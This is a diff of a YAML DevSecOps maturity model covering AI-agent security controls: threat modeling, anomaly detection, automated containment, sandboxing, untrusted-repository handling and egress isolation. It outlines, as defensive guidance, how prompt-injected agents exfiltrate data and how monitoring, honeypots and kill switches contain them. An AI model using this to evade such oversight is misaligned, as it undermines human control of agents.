+        standards) are defined in the _Culture and Organization_ dimension,
+        subdimension _Design_. This activity only adds the AI-specific delta.
+        AI components introduce elements classic threat models miss: the model
+        context as a data flow that attackers reach via prompts, documents and
+        tool results; agents and tool integrations as trust boundaries;
+        retrieval-augmented generation (RAG) knowledge bases and training data
+        as poisoning targets; model output as an injection vector. The subject
+        here is the product: applications that contain AI components. Passing
+        security requirements into AI-*assisted* implementation of arbitrary
+        features is covered by _Security requirements for AI-assisted
+        development_.
+
+        A data-centric approach works well for the AI delta: follow the data
+        (prompts, retrieved documents, tool results, training and evaluation
+        data) through every transformation and storage point and model the
+        threats along that flow, as described in the guidance of NIST SP
+        800-154 (data-centric system threat modeling). Running only the
+        generic checklist over an AI feature leaves these risks
+        undiscovered, because the AI-specific data flows never appear in it.
+
+        When evaluating mitigations, apply the design test from Anthropic's
+        _Zero Trust for AI Agents_: "does this make the attack impossible,
+        or just tedious?" Agentic attackers automate tedium away: they
+        retry endlessly at almost no cost, so a control that only adds
+        friction (a rate limit, one more network hop to pivot through, a
+        non-standard port) loses its value. Favor controls that take a
+        capability away entirely, such as a network path that simply does
+        not exist or a credential that has already expired.
       risk: |-
         AI-specific threats such as prompt injection paths, excessive agency of tool-using agents,
         data leakage through the model context and poisoning of
@@ -1523,11 +1666,13 @@ AI:
         - threat
         - documentation
         url: https://storage.googleapis.com/deepmind-media/DeepMind.com/Blog/securing-the-future-of-ai-agents/gdm-ai-control-roadmap.pdf
-        description: "Roadmap for controlling potentially misaligned AI agents: treats
-          agents\nas untrusted principals and layers system-level defences \u2014
-          TRAIT&R threat\ntaxonomy (based on MITRE ATT&CK), action/chain-of-thought
-          monitoring,\npull-request monitoring, UEBA anomaly detection, honeypots
-          and tiered\nprevention/response up to shutdown infrastructure."
+        description: |-
+          Roadmap for controlling potentially misaligned AI agents. It treats
+          agents as untrusted principals and layers system-level defences: the
+          TRAIT&R threat taxonomy (based on MITRE ATT&CK),
+          action/chain-of-thought monitoring, pull-request monitoring, UEBA
+          anomaly detection, honeypots and tiered prevention/response up to
+          shutdown infrastructure.
       - uuid: 1234eb34-0f97-4ef2-ab64-adc3516a4d1e
         name: 'OWASP AISVS C09: Orchestration and Agentic Security'
         tags:
@@ -1594,6 +1739,33 @@ AI:
           Outcome) decomposes an agentic system into seven layers (from foundation
           model to agent ecosystem) and models threats per layer and across
           layer interactions.
+      - uuid: 1d8c211c-7987-48c2-8bfc-1f77076516ec
+        name: 'Rethinking Security: Why ML and AI Demand a New Approach to Threat
+          Modeling'
+        tags:
+        - ai
+        - documentation
+        - threat
+        url: https://www.fullstory.com/blog/rethinking-security/
+        description: |-
+          Experience report on threat modeling machine learning (ML) and AI
+          systems in production: standard checklists miss AI-specific risks; a
+          data-centric approach following NIST SP 800-154 tracks the data from
+          user input through model context, inference and storage. References
+          Microsoft's guide "Threat Modeling AI/ML Systems and Dependencies" and
+          MITRE ATLAS.
+      - uuid: 38b95d1b-558d-4a04-9b68-34f9d57c4aae
+        name: Threat Designer
+        tags:
+        - ai
+        - threat
+        - tool
+        url: https://github.com/awslabs/threat-designer
+        description: |-
+          Open-source (Apache 2.0), AI-driven threat modeling application by AWS
+          Labs: agents analyze uploaded architecture diagrams, derive STRIDE-based
+          threat lists and attack trees, and support iterative refinement and
+          export of the resulting threat model.
       - uuid: fd0f282b-a065-4464-beed-770c604a5f52
         name: Threat Modeling Playbook
         tags:
@@ -1613,12 +1785,14 @@ AI:
         - ai
         - documentation
         url: https://owasp.org/www-project-ai-maturity-assessment/
-        description: "Maturity model for AI systems (v1.0, August 2025) in the style
-          of the\nOWASP Software Assurance Maturity Model (SAMM), with eight domains:\nresponsible
-          AI, governance, data management, privacy, design,\nimplementation, verification
-          and operations. Each practice defines\nthree maturity levels with assessment
-          worksheets \u2014 usable to assess\nand plan the organizational maturity
-          around the AI activities of this\ndimension."
+        description: |-
+          Maturity model for AI systems (v1.0, August 2025) in the style of the
+          OWASP Software Assurance Maturity Model (SAMM), with eight domains:
+          responsible AI, governance, data management, privacy, design,
+          implementation, verification and operations. Each practice defines
+          three maturity levels with assessment worksheets, usable to assess
+          and plan the organizational maturity around the AI activities of this
+          dimension.
       - uuid: 672695ce-e62d-4283-8676-ea630f544709
         name: OWASP AI Exchange
         tags:
@@ -1633,6 +1807,21 @@ AI:
           input and output handling, monitoring, rate limiting and model
           robustness, plus chapters on AI security testing and AI privacy.
           Feeds international standardization (ISO/IEC 27090).
+      - uuid: 7c0749f8-080d-46cf-a8bb-4c2f8a2c25f2
+        name: Zero Trust for AI Agents
+        tags:
+        - ai
+        - documentation
+        url: https://claude.com/blog/zero-trust-for-ai-agents
+        description: |-
+          Free eBook by Anthropic applying Zero Trust principles (never trust,
+          always verify; assume breach; least privilege and least agency) to
+          agentic AI deployments: current threats to agentic systems, three
+          capability tiers for agent identity, access control, observability,
+          behavioral monitoring, input and output controls and recovery, an
+          eight-phase implementation workflow and defensive operations at the
+          speed of autonomous threats. Introduces the design test "does this
+          control make the attack impossible, or just tedious?".
       references:
         samm2:
         - D-TA-A-1
@@ -1645,14 +1834,16 @@ AI:
       comments: ""
     Anomaly detection for AI agent behavior:
       uuid: 99049c0a-400f-4c58-986c-ab448ca8e0fc
-      description: "Audit logs record what agents do; anomaly detection turns those\nrecords
-        into a signal while intervention is still possible. A\ncompromised (e.g. prompt-injected)
-        or malfunctioning agent typically\nstays within its granted permissions, so
-        no single action is blocked\n\u2014 what changes is the pattern: tool-call
-        frequency, data access\nvolumes, targeted systems, activity times or failure
-        rates deviate\nfrom the agent's normal behavior. This activity builds on _Audit\nlogging
-        of AI agent actions_ and feeds detections into the generic\n_Alerting_ (Information
-        Gathering)."
+      description: |-
+        Audit logs record what agents do; anomaly detection turns those
+        records into a signal while intervention is still possible. A
+        compromised (e.g. prompt-injected) or malfunctioning agent typically
+        stays within its granted permissions, so no single action is blocked.
+        What changes is the pattern: tool-call frequency, data access
+        volumes, targeted systems, activity times or failure rates deviate
+        from the agent's normal behavior. This activity builds on _Audit
+        logging of AI agent actions_ and feeds detections into the generic
+        _Alerting_ (Information Gathering).
       risk: |-
         A manipulated or malfunctioning agent operates unnoticed for days
         within its permissions: it exfiltrates data in small portions, calls
@@ -1695,25 +1886,29 @@ AI:
         - logging
         - documentation
         url: https://labs.cloudsecurityalliance.org/agentic/agentic-identity-governance-framework-v1/
-        description: "Vendor-neutral framework (Richard Peddi, v2.1, CC BY 4.0) for
-          identity,\naccess and content governance of autonomous AI agents along six
-          axes:\nidentification (shadow agents), authentication, authorization,\naudit/non-repudiation
-          (structured audit log with mandatory fields for\nthe causal chain, correlation
-          identifiers across multi-agent chains,\ntamper evidence via hash chaining
-          and write-once storage),\nprompt injection prevention and data flow tracking
-          \u2014 mapped to EU AI Act,\nGDPR, ISO 42001/27001 and NIST AI RMF."
+        description: |-
+          Vendor-neutral framework (Richard Peddi, v2.1, CC BY 4.0) for identity,
+          access and content governance of autonomous AI agents along six axes:
+          identification (shadow agents), authentication, authorization,
+          audit/non-repudiation (structured audit log with mandatory fields for
+          the causal chain, correlation identifiers across multi-agent chains,
+          tamper evidence via hash chaining and write-once storage),
+          prompt injection prevention and data flow tracking. The framework is
+          mapped to EU AI Act, GDPR, ISO 42001/27001 and NIST AI RMF.
       - uuid: 7bae85fe-adab-4279-ad8d-df842ab922cf
         name: OWASP AI Maturity Assessment (AIMA)
         tags:
         - ai
         - documentation
         url: https://owasp.org/www-project-ai-maturity-assessment/
-        description: "Maturity model for AI systems (v1.0, August 2025) in the style
-          of the\nOWASP Software Assurance Maturity Model (SAMM), with eight domains:\nresponsible
-          AI, governance, data management, privacy, design,\nimplementation, verification
-          and operations. Each practice defines\nthree maturity levels with assessment
-          worksheets \u2014 usable to assess\nand plan the organizational maturity
-          around the AI activities of this\ndimension."
+        description: |-
+          Maturity model for AI systems (v1.0, August 2025) in the style of the
+          OWASP Software Assurance Maturity Model (SAMM), with eight domains:
+          responsible AI, governance, data management, privacy, design,
+          implementation, verification and operations. Each practice defines
+          three maturity levels with assessment worksheets, usable to assess
+          and plan the organizational maturity around the AI activities of this
+          dimension.
       - uuid: 9d226705-6a42-4653-aa98-53d7e69e8a4c
         name: OWASP Top 10 for Agentic Applications
         tags:
@@ -1739,6 +1934,21 @@ AI:
           and secret detection), cost budgets per request, session and day with
           circuit breakers, behavioral baselines with kill switch, and a
           tamper-evident audit trail with correlation identifiers.
+      - uuid: 7c0749f8-080d-46cf-a8bb-4c2f8a2c25f2
+        name: Zero Trust for AI Agents
+        tags:
+        - ai
+        - documentation
+        url: https://claude.com/blog/zero-trust-for-ai-agents
+        description: |-
+          Free eBook by Anthropic applying Zero Trust principles (never trust,
+          always verify; assume breach; least privilege and least agency) to
+          agentic AI deployments: current threats to agentic systems, three
+          capability tiers for agent identity, access control, observability,
+          behavioral monitoring, input and output controls and recovery, an
+          eight-phase implementation workflow and defensive operations at the
+          speed of autonomous threats. Introduces the design test "does this
+          control make the attack impossible, or just tedious?".
       references:
         samm2:
         - O-IM-A-2
@@ -1751,36 +1961,55 @@ AI:
       comments: ""
     Dynamic load of security rules:
       uuid: 862d08a4-7299-4b2c-9d38-8fcaade66d3e
-      description: "In spec-driven development, AI-assisted work is split into explicit
-        steps\n(e.g. specify, plan, implement, review). Model context is limited:
-        loading\nall security guidance at once dilutes it, loading it at the wrong
-        step\nmeans it is absent when needed. Security artifacts are therefore assigned\nto
-        the step where they are effective: security requirements and abuse\ncases
-        during specification, threat model results during planning, secure\ncoding
-        rules during implementation, review checklists during verification.\n\nTwo
-        ways to bind security artifacts to workflow steps, using Spec Kit\nwith Claude
-        Code as example:\n\n1. **Extend the step templates**: add the security artifact
-        references\n   directly to the phase templates (e.g. `.specify/templates/`).
-        Simple,\n   but the changes live inside the tool's files and must be re-applied\n
-        \  after tool updates.\n2. **Hook that detects the step command** (update-safe
-        and automatic):\n   a `UserPromptSubmit` hook fires on every prompt, checks
-        which\n   workflow command was invoked and injects the matching file as\n
-        \  `additionalContext` \u2014 the tool's templates stay untouched and the\n
-        \  step-to-artifact mapping lives in one central place:\n\n   ```bash\n   #!/bin/bash\n
-        \  input=$(cat)\n   prompt=$(jq -r '.prompt // empty' <<<\"$input\")\n\n   case
-        \"$prompt\" in\n     /speckit.plan*)      file=\"specs/threat-model.md\" ;;\n
-        \    /speckit.implement*) file=\"docs/secure-coding-rules.md\" ;;\n     /speckit.review*)
-        \   file=\"docs/security-review-checklist.md\" ;;\n     *) exit 0 ;;\n   esac\n\n
-        \  jq -nc --arg ctx \"$(cat \"$file\")\" \\\n     '{hookSpecificOutput: {hookEventName:
-        \"UserPromptSubmit\",\n       additionalContext: $ctx}}'\n   ```\n\n   Registered
-        in `.claude/settings.json` under `hooks`, the mapping is\n   versioned with
-        the repository, survives Spec Kit updates and cannot\n   be forgotten by developers.
-        Keep the injected artifacts small and\n   step-specific \u2014 the goal is
-        the right rules in context, not all\n   rules."
-      risk: "Security rules exist but are not in the model context at the step where\nthe
-        AI assistant needs them \u2014 or the context is flooded with irrelevant\nrules
-        so the model ignores them. Generated specifications, plans and code\nsilently
-        drop security requirements between steps."
+      description: |-
+        In spec-driven development, AI-assisted work is split into explicit steps
+        (e.g. specify, plan, implement, review). Model context is limited: loading
+        all security guidance at once dilutes it, loading it at the wrong step
+        means it is absent when needed. Security artifacts are therefore assigned
+        to the step where they are effective: security requirements and abuse
+        cases during specification, threat model results during planning, secure
+        coding rules during implementation, review checklists during verification.
+
+        Two ways to bind security artifacts to workflow steps, using Spec Kit
+        with Claude Code as example:
+
+        1. **Extend the step templates**: add the security artifact references
+           directly to the phase templates (e.g. `.specify/templates/`). Simple,
+           but the changes live inside the tool's files and must be re-applied
+           after tool updates.
+        2. **Hook that detects the step command** (update-safe and automatic):
+           a `UserPromptSubmit` hook fires on every prompt, checks which
+           workflow command was invoked and injects the matching file as
+           `additionalContext`. The tool's templates stay untouched and the
+           step-to-artifact mapping lives in one central place:
+
+           ```bash
+           #!/bin/bash
+           input=$(cat)
+           prompt=$(jq -r '.prompt // empty' <<<"$input")
+
+           case "$prompt" in
+             /speckit.plan*)      file="specs/threat-model.md" ;;
+             /speckit.implement*) file="docs/secure-coding-rules.md" ;;
+             /speckit.review*)    file="docs/security-review-checklist.md" ;;
+             *) exit 0 ;;
+           esac
+
+           jq -nc --arg ctx "$(cat "$file")" \
+             '{hookSpecificOutput: {hookEventName: "UserPromptSubmit",
+               additionalContext: $ctx}}'
+           ```
+
+           Registered in `.claude/settings.json` under `hooks`, the mapping is
+           versioned with the repository, survives Spec Kit updates and cannot
+           be forgotten by developers. Keep the injected artifacts small and
+           step-specific: the goal is the right rules in context, not all
+           rules.
+      risk: |-
+        Security rules exist but are not in the model context at the step where
+        the AI assistant needs them, or the context is flooded with irrelevant
+        rules so the model ignores them. Generated specifications, plans and code
+        silently drop security requirements between steps.
       measure: |-
         Structure AI-assisted development workflows so that each step loads its
         relevant security artifacts into the model context (e.g. via step-specific
@@ -1848,19 +2077,149 @@ AI:
         openCRE:
         - https://www.opencre.org/node/standard/DevSecOps%20Maturity%20Model%20%28DSOMM%29/section/Guidance/subsection/Dynamic%20load%20of%20security%20rules
       comments: ""
+    Automated containment of anomalous AI agents:
+      uuid: 3bbd6dd9-0821-426c-8a19-41737ed61459
+      description: |-
+        _Anomaly detection for AI agent behavior_ raises the signal; this
+        activity determines how fast it is acted on. Compromised agents
+        operate at machine speed: by the time a human has read the alert, an
+        agent may have exfiltrated data in small portions or spread through
+        delegated tasks. Automated containment executes pre-approved,
+        narrowly scoped and reversible actions immediately, for example
+        pausing the agent, terminating its sessions, revoking its
+        short-lived credentials or reducing its privileges to a safe
+        baseline. Far-reaching decisions remain with humans. The guiding
+        principle: automate the bookkeeping (evidence collection,
+        correlation, documentation of the incident), not the decisions
+        (containment of business-critical systems, disclosure, customer
+        communication). In multi-agent systems, containment also has to
+        stop cascades: one faulty or compromised agent can trigger many
+        downstream agents in a short time (OWASP Top 10 for Agentic
+        Applications, ASI08).
+      risk: |-
+        An anomaly alert fires, but the response is manual: hours pass
+        between detection and containment while the compromised agent keeps
+        operating within its granted permissions. The damage window is
+        defined by human reaction time instead of detection time, and the
+        human spends that time collecting evidence instead of deciding.
+      measure: |-
+        Define an automated containment action per detection class and wire
+        it to the anomaly detection: pause the agent, terminate its
+        sessions, revoke its credentials or reduce its privileges. Keep the
+        actions reversible and graduated by confidence and severity, log
+        every automated action and notify a human immediately. Let an AI
+        assistant draft the triage context (timeline, affected systems,
+        collected evidence) so the notified human decides instead of
+        collecting, and test the containment path regularly like a fire
+        drill. Alert on cascade symptoms such as rapid fan-out (one
+        decision triggers many downstream agents or tasks) and oscillating
+        retry loops between agents, and place circuit breakers between
+        planning and execution so that a runaway plan stops instead of
+        propagating. Return a contained agent to production only after its
+        instructions, memory and dependencies have been verified against a
+        known-good state and a human has approved the reintegration.
+      dependsOn:
+      - 99049c0a-400f-4c58-986c-ab448ca8e0fc # Anomaly detection for AI agent behavior
+      - 45f722b2-25b4-472a-a743-f7207a77b5c9 # Least privilege on external systems for AI agents
+      assessment: |
+        - Show the mapping of detection classes to automated containment actions and their graduation by confidence and severity.
+        - Demonstrate in a test that an anomalously behaving agent is automatically paused or its credentials revoked, the action is logged and a human is notified.
+        - Show the drafted triage context of a past or simulated incident and the human decision based on it.
+        - Show the protocol of the last containment test.
+        - Show the cascade guardrails (fan-out alerts, circuit breakers between planning and execution) and the reintegration protocol of a contained agent.
+      difficultyOfImplementation:
+        knowledge: 4
+        time: 3
+        resources: 2
+      usefulness: 4
+      level: 5
+      tags:
+      - ai
+      - guidance
+      - logging
+      implementation:
+      - uuid: bbaf5f6a-0366-488b-a712-7f915e866135
+        name: Agent Identity Governance Framework (AIGF)
+        tags:
+        - ai
+        - isolation
+        - permissions
+        - logging
+        - documentation
+        url: https://labs.cloudsecurityalliance.org/agentic/agentic-identity-governance-framework-v1/
+        description: |-
+          Vendor-neutral framework (Richard Peddi, v2.1, CC BY 4.0) for identity,
+          access and content governance of autonomous AI agents along six axes:
+          identification (shadow agents), authentication, authorization,
+          audit/non-repudiation (structured audit log with mandatory fields for
+          the causal chain, correlation identifiers across multi-agent chains,
+          tamper evidence via hash chaining and write-once storage),
+          prompt injection prevention and data flow tracking. The framework is
+          mapped to EU AI Act, GDPR, ISO 42001/27001 and NIST AI RMF.
+      - uuid: 7bae85fe-adab-4279-ad8d-df842ab922cf
+        name: OWASP AI Maturity Assessment (AIMA)
+        tags:
+        - ai
+        - documentation
+        url: https://owasp.org/www-project-ai-maturity-assessment/
+        description: |-
+          Maturity model for AI systems (v1.0, August 2025) in the style of the
+          OWASP Software Assurance Maturity Model (SAMM), with eight domains:
+          responsible AI, governance, data management, privacy, design,
+          implementation, verification and operations. Each practice defines
+          three maturity levels with assessment worksheets, usable to assess
+          and plan the organizational maturity around the AI activities of this
+          dimension.
+      - uuid: 9d226705-6a42-4653-aa98-53d7e69e8a4c
+        name: OWASP Top 10 for Agentic Applications
+        tags:
+        - ai
+        - documentation
+        - threat
+        url: https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/
+        description: |-
+          The ten most critical security risks of agentic AI systems (ASI01-ASI10),
+          e.g. agent goal hijack, tool misuse, memory poisoning and rogue agents.
+          Usable as a threat catalog for threat modeling and red teaming of AI agents.
+      - uuid: 7c0749f8-080d-46cf-a8bb-4c2f8a2c25f2
+        name: Zero Trust for AI Agents
+        tags:
+        - ai
+        - documentation
+        url: https://claude.com/blog/zero-trust-for-ai-agents
+        description: |-
+          Free eBook by Anthropic applying Zero Trust principles (never trust,
+          always verify; assume breach; least privilege and least agency) to
+          agentic AI deployments: current threats to agentic systems, three
+          capability tiers for agent identity, access control, observability,
+          behavioral monitoring, input and output controls and recovery, an
+          eight-phase implementation workflow and defensive operations at the
+          speed of autonomous threats. Introduces the design test "does this
+          control make the attack impossible, or just tedious?".
+      references:
+        samm2:
+        - O-IM-B-2
+        iso27001-2017:
+        - 16.1.5
+        iso27001-2022:
+        - 5.26
+        openCRE:
+        - https://www.opencre.org/node/standard/DevSecOps%20Maturity%20Model%20%28DSOMM%29/section/Guidance/subsection/Automated%20containment%20of%20anomalous%20AI%20agents
+      comments: ""
   Isolation:
-    Container-based isolation of AI agents:
+    Usage of sandboxing for AI agents:
       uuid: 4debe8ea-f54a-4a00-a1cb-6fad9e571a88
       description: |-
         AI coding assistants and agents execute commands, install dependencies and
-        run generated code autonomously. Running them in disposable, container-based
-        environments (e.g. dev containers, sandboxes, ephemeral virtual machines)
-        limits the blast radius of malicious or faulty agent behavior.
+        run generated code autonomously. Running them in disposable, sandboxed
+        environments limits the blast radius of malicious or faulty agent behavior.
 
-        Use container technology (e.g. dev containers) or lightweight virtual machines
-        to sandbox agent runs. Mount only the repository being worked on, avoid mounting
+        Use a sandboxing technology to isolate agent runs, e.g. container-based
+        isolation (dev containers), lightweight virtual machines or OS-level
+        sandboxing mechanisms. Mount only the repository being worked on, avoid mounting
         credentials (e.g. cloud CLI configuration, SSH keys) and drop unneeded capabilities.
-        Destroy the environment after the task is finished.
+        Destroy the environment after the task is finished. Restricting network
+        egress of the sandbox is addressed by _Network isolation for AI agents_.
       risk: |-
         An AI agent may be manipulated (e.g. via prompt injection in source code,
         issues, dependencies or web content) or may malfunction. Without isolation,
@@ -1868,10 +2227,12 @@ AI:
         the developer workstation and connected systems.
       measure: |-
         Run AI agents and AI coding assistants with command execution capabilities in
-        a dedicated, least-privilege container or virtual machine which contains only
-        the required project files and is destroyed after use.
+        a dedicated, least-privilege sandbox (e.g. a container or virtual machine)
+        which contains only the required project files and is destroyed after use.
+      dependsOn:
+      - 3a94d55e-fd82-4996-9eb3-20d23ff2a873 # Applications are running in virtualized environments
       assessment: |
-        - Show the container or virtual machine configuration used for AI agent runs (e.g. a dev container definition) and demonstrate a live agent session running inside it.
+        - Show the sandbox configuration used for AI agent runs (e.g. a dev container definition) and demonstrate a live agent session running inside it.
         - Show that only the project working directory is mounted and no credentials (SSH keys, cloud CLI configuration) are reachable from inside the environment.
         - Demonstrate that the environment is destroyed after the task is finished.
       difficultyOfImplementation:
@@ -1943,7 +2304,7 @@ AI:
         iso27001-2022:
         - 8.31
         openCRE:
-        - https://www.opencre.org/node/standard/DevSecOps%20Maturity%20Model%20%28DSOMM%29/section/Isolation/subsection/Container-based%20isolation%20of%20AI%20agents
+        - https://www.opencre.org/node/standard/DevSecOps%20Maturity%20Model%20%28DSOMM%29/section/Isolation/subsection/Usage%20of%20sandboxing%20for%20AI%20agents
       comments: ""
     Permission management for AI agents:
       uuid: 4a618049-19da-4e20-b933-81f203ecd4d2
@@ -2040,16 +2401,19 @@ AI:
       comments: ""
     Rate limiting and resource budgets for AI systems:
       uuid: 64aef733-bfb0-4df4-95de-bcecf668605d
-      description: "Every model call costs compute and money, and AI endpoints answer\nexpensive
-        requests on demand. Without limits a single user, script or\nrunaway agent
-        can exhaust the service: availability suffers or the\nprovider bill explodes
-        (\"denial of wallet\"), and mass querying of a\nmodel additionally enables
-        extraction of its behavior via\ninput-output harvesting. Limits apply in both
-        directions: inbound on\nexposed AI endpoints (requests per user and time window),
-        outbound\nfor the organization's own agents (token and cost budgets, iteration\ncaps
-        against runaway loops). The generic resource limits for\ninfrastructure are
-        defined in _Virtual environments are limited_\n(Implementation) \u2014 this
-        activity adds the AI-specific units:\nrequests, tokens and cost."
+      description: |-
+        Every model call costs compute and money, and AI endpoints answer
+        expensive requests on demand. Without limits a single user, script or
+        runaway agent can exhaust the service: availability suffers or the
+        provider bill explodes ("denial of wallet"), and mass querying of a
+        model additionally enables extraction of its behavior via
+        input-output harvesting. Limits apply in both directions: inbound on
+        exposed AI endpoints (requests per user and time window), outbound
+        for the organization's own agents (token and cost budgets, iteration
+        caps against runaway loops). The generic resource limits for
+        infrastructure are defined in _Virtual environments are limited_
+        (Implementation). This activity adds the AI-specific units:
+        requests, tokens and cost.
       risk: |-
         An attacker or a buggy client floods an AI endpoint with expensive
         requests: the service becomes unavailable for legitimate users or
@@ -2130,6 +2494,17 @@ AI:
           A list of the most critical vulnerabilities of LLM-based applications, e.g.
           prompt injection, insecure output handling and excessive agency. A good
           baseline for manual AI red teaming.
+      - uuid: 9d226705-6a42-4653-aa98-53d7e69e8a4c
+        name: OWASP Top 10 for Agentic Applications
+        tags:
+        - ai
+        - documentation
+        - threat
+        url: https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/
+        description: |-
+          The ten most critical security risks of agentic AI systems (ASI01-ASI10),
+          e.g. agent goal hijack, tool misuse, memory poisoning and rogue agents.
+          Usable as a threat catalog for threat modeling and red teaming of AI agents.
       references:
         samm2:
         - O-EM-A-1
@@ -2143,23 +2518,28 @@ AI:
     Untrusted workspace handling for AI agents:
       uuid: 859c71b6-110f-40a9-9c98-20e8314ebdb7
       description: |-
-        Launching an AI coding agent inside a cloned third-party repository can
-        execute attacker-controlled content before any trust is granted:
-        repo-local agent settings, hooks, MCP definitions and planted binaries
-        have repeatedly led to code execution ahead of the workspace trust
-        dialog (documented vulnerabilities in Claude Code and Cursor). A repo
-        checked out "just to review a pull request" is an attack vector.
-      risk: "A developer clones a malicious repository and starts the agent in it;\nrepo-controlled
-        configuration or binaries execute on launch, before the\ntrust prompt is answered
-        \u2014 code execution on the developer machine with\naccess to credentials
-        and other projects."
+        Launching an AI coding agent inside a cloned third-party repository
+        can hand control to the repository author before the user grants any
+        trust: documented vulnerabilities in several agents (e.g. Claude
+        Code, Cursor) showed that files under the repository's control
+        (agent settings, hooks, definitions of Model Context Protocol (MCP)
+        servers, bundled executables) were already evaluated while the
+        workspace trust dialog was still unanswered. Even a checkout done
+        only for a code review can therefore be enough to compromise the
+        developer workstation.
+      risk: |-
+        An attacker publishes a prepared repository; when a developer opens
+        it with an AI agent, configuration or executables under the
+        attacker's control run on the developer machine before any trust
+        decision, with access to credentials and every other project on
+        that machine.
       measure: |-
         Treat third-party repositories as untrusted workspaces: open them only
         in an isolated container, do not honor repo-local agent configuration
         (hooks, MCP servers, settings) of untrusted origin, keep agent versions
         patched and never disable workspace trust prompts.
       dependsOn:
-      - 4debe8ea-f54a-4a00-a1cb-6fad9e571a88 # Container-based isolation of AI agents
+      - 4debe8ea-f54a-4a00-a1cb-6fad9e571a88 # Usage of sandboxing for AI agents
       assessment: |
         - Show the documented procedure for opening third-party repositories with AI agents.
         - Demonstrate that workspace trust prompts are enabled and that repository-local agent configuration (hooks, MCP servers, settings) is not honored for untrusted repositories.
@@ -2230,13 +2610,11 @@ AI:
         never holds. Log and review agent actions separately from human actions.
       dependsOn:
       - 4a618049-19da-4e20-b933-81f203ecd4d2 # Permission management for AI agents
-      assessment: "- Show a dedicated agent identity in the source code management
-        system (or other external system) and the scopes granted to it.\n- Show that
-        agent credentials are short-lived and minimally scoped (token configuration
-        or issuance policy).\n- Show where agent credentials are stored and injected
-        \u2014 preferably outside the agent process (e.g. credential injection at
-        a proxy or gateway).\n- Demonstrate that agent actions are distinguishable
-        from human actions in the audit log.\n"
+      assessment: |
+        - Show a dedicated agent identity in the source code management system (or other external system) and the scopes granted to it.
+        - Show that agent credentials are short-lived and minimally scoped (token configuration or issuance policy).
+        - Show where agent credentials are stored and injected, preferably outside the agent process (e.g. credential injection at a proxy or gateway).
+        - Demonstrate that agent actions are distinguishable from human actions in the audit log.
       difficultyOfImplementation:
         knowledge: 3
         time: 2
@@ -2256,13 +2634,15 @@ AI:
         - logging
         - documentation
         url: https://labs.cloudsecurityalliance.org/agentic/agentic-identity-governance-framework-v1/
-        description: "Vendor-neutral framework (Richard Peddi, v2.1, CC BY 4.0) for
-          identity,\naccess and content governance of autonomous AI agents along six
-          axes:\nidentification (shadow agents), authentication, authorization,\naudit/non-repudiation
-          (structured audit log with mandatory fields for\nthe causal chain, correlation
-          identifiers across multi-agent chains,\ntamper evidence via hash chaining
-          and write-once storage),\nprompt injection prevention and data flow tracking
-          \u2014 mapped to EU AI Act,\nGDPR, ISO 42001/27001 and NIST AI RMF."
+        description: |-
+          Vendor-neutral framework (Richard Peddi, v2.1, CC BY 4.0) for identity,
+          access and content governance of autonomous AI agents along six axes:
+          identification (shadow agents), authentication, authorization,
+          audit/non-repudiation (structured audit log with mandatory fields for
+          the causal chain, correlation identifiers across multi-agent chains,
+          tamper evidence via hash chaining and write-once storage),
+          prompt injection prevention and data flow tracking. The framework is
+          mapped to EU AI Act, GDPR, ISO 42001/27001 and NIST AI RMF.
       - uuid: 181e9b98-7d4f-4fff-9181-9f4c4408022e
         name: Anthropic Agent Identity and Access Model
         tags:
@@ -2310,6 +2690,32 @@ AI:
         url: https://github.com/hashicorp/vault
         description: |
           A tool for secrets management, encryption as a service, and privileged access management.
+      - uuid: 7c0749f8-080d-46cf-a8bb-4c2f8a2c25f2
+        name: Zero Trust for AI Agents
+        tags:
+        - ai
+        - documentation
+        url: https://claude.com/blog/zero-trust-for-ai-agents
+        description: |-
+          Free eBook by Anthropic applying Zero Trust principles (never trust,
+          always verify; assume breach; least privilege and least agency) to
+          agentic AI deployments: current threats to agentic systems, three
+          capability tiers for agent identity, access control, observability,
+          behavioral monitoring, input and output controls and recovery, an
+          eight-phase implementation workflow and defensive operations at the
+          speed of autonomous threats. Introduces the design test "does this
+          control make the attack impossible, or just tedious?".
+      - uuid: 9d226705-6a42-4653-aa98-53d7e69e8a4c
+        name: OWASP Top 10 for Agentic Applications
+        tags:
+        - ai
+        - documentation
+        - threat
+        url: https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/
+        description: |-
+          The ten most critical security risks of agentic AI systems (ASI01-ASI10),
+          e.g. agent goal hijack, tool misuse, memory poisoning and rogue agents.
+          Usable as a threat catalog for threat modeling and red teaming of AI agents.
       references:
         samm2:
         - O-EM-A-1
@@ -2322,31 +2728,40 @@ AI:
       comments: ""
     Network isolation for AI agents:
       uuid: 951e6090-057b-4dc4-8b4f-18c6adcfc1ab
-      description: "Restricting the network egress of AI agent environments prevents
-        data\nexfiltration and the download of malicious tooling in case an agent
-        is\nhijacked through prompt injection.\n\nExample for a coding agent like
-        Claude Code running in a container:\n\n1. **Firewall inside the container**:
-        on container start, an init script\n   running with the `NET_ADMIN` capability
-        configures a default-deny\n   egress policy (iptables) and resolves an allow-list
-        of required\n   domains into an ipset \u2014 model API (e.g. `api.anthropic.com`),
-        package\n   registries (e.g. `registry.npmjs.org`) and the source code management\n
-        \  system. Anthropic's reference devcontainer ships this as\n   `init-firewall.sh`.
-        The agent process runs as a non-root user\n   afterwards, so it cannot alter
-        the firewall rules it is confined by.\n2. **Alternative \u2014 egress proxy**:
-        attach the container to an internal\n   network without direct internet access
-        (e.g.\n   `docker network create --internal`) and route traffic through a\n
-        \  filtering HTTP(S) proxy (`HTTPS_PROXY` environment variable) that\n   enforces
-        the domain allow-list and logs all requests. In Kubernetes,\n   enforce the
-        same with NetworkPolicies or a service mesh egress\n   gateway.\n3. **DNS**:
-        allow DNS only to the internal resolver and only for\n   allow-listed domains,
-        otherwise blocked domains remain reachable via\n   direct IP or DNS tunneling
-        can be used for exfiltration.\n4. **Verify**: from inside the running container,
-        check that a request\n   to an allow-listed endpoint succeeds and a request
-        to an arbitrary\n   host (e.g. `curl https://example.com`) is blocked.\n\nIsolation-conscious
-        design pays a double dividend: forcing all agent\ntraffic through one enforced
-        egress point (firewall or proxy) creates\na monitored bottleneck \u2014 attacks
-        that would otherwise be invisible\nmust pass through it, which is a high-leverage
-        place for detection\n(see the Google DeepMind AI Control Roadmap)."
+      description: |-
+        Restricting the network egress of AI agent environments prevents data
+        exfiltration and the download of malicious tooling in case an agent is
+        hijacked through prompt injection.
+
+        Example for a coding agent like Claude Code running in a container:
+
